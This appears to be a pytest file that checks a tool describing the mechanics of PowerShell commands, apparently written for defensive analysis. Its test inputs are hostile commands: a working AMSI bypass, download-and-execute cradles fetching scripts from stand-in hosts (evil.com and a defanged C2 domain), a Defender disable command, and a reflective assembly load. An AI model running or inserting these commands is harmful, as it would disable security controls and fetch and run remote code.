"""Smoke tests for PowerShell inline payload analysis."""
from app.story import _describe_mechanics


def _r(command: str) -> str | None:
    return _describe_mechanics({"command": command, "binaries_in_command": [{"name": "powershell"}]})


def test_amsi_bypass_plus_download_cradle():
    cmd = (
        "powershell -ep bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); "
        "iex (New-Object Net.WebClient).DownloadString('hxxp://c2.sec-updates[.]org/payload.ps1')\""
    )
    result = _r(cmd)
    assert result is not None
    assert "AMSI" in result
    assert "download" in result.lower()
    assert "c2.sec-updates" in result
    assert "execute" in result.lower()


def test_download_cradle_only():
    cmd = "powershell -c \"iex (New-Object Net.WebClient).DownloadString('hxxp://evil.com/shell.ps1')\""
    result = _r(cmd)
    assert result is not None
    assert "download" in result.lower()
    assert "evil.com" in result
    assert "execute" in result.lower()


def test_reflective_load():
    cmd = "powershell -c \"$b=[Convert]::FromBase64String('AABB'); [Reflection.Assembly]::Load($b)\""
    result = _r(cmd)
    assert result is not None
    assert "base64" in result.lower() or "decode" in result.lower()
    assert "reflective" in result.lower() or "assembly" in result.lower()


def test_defender_disable():
    cmd = "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\""
    result = _r(cmd)
    assert result is not None
    assert "Defender" in result


def test_benign_inline_falls_back_to_generic():
    """No notable patterns → falls back to generic inline description."""
    cmd = "powershell -c \"Get-Process\""
    result = _r(cmd)
    assert result is not None
    assert "inline" in result.lower()


def test_encoded_command_unaffected():
    """Encoded command (-enc) is distinct from -c; must NOT trigger inline analysis.
    The 20-char guard requires a realistic-length payload; short strings fall through
    to the purpose-only phrase rather than false-positive on benign short args."""
    # Real-length encoded payload — should describe as base64-encoded
    long_enc = "JABhAD0AIgBoAGUAbABsAG8AIAB3AG8AcgBsAGQAIgA="
    cmd_long = f"powershell -enc {long_enc}"
    result_long = _r(cmd_long)
    assert result_long is not None
    assert "base64-encoded" in result_long.lower()

    # Short token — under 20 chars, pattern intentionally does not fire
    cmd_short = "powershell -enc JABhAD0A"
    result_short = _r(cmd_short)
    assert result_short is not None
    # Must NOT trigger the -c inline analysis path
    assert "AMSI" not in (result_short or "")
    assert "download" not in (result_short or "").lower()


def test_etw_patch():
    cmd = "powershell -c \"[Reflection.Assembly]::LoadWithPartialName('System.Core'); EtwEventWrite\""
    result = _r(cmd)
    assert result is not None
    assert "ETW" in result


def test_injection_primitives():
    cmd = "powershell -c \"VirtualAlloc; WriteProcessMemory; CreateRemoteThread\""
    result = _r(cmd)
    assert result is not None
    assert "inject" in result.lower() or "memory" in result.lower()
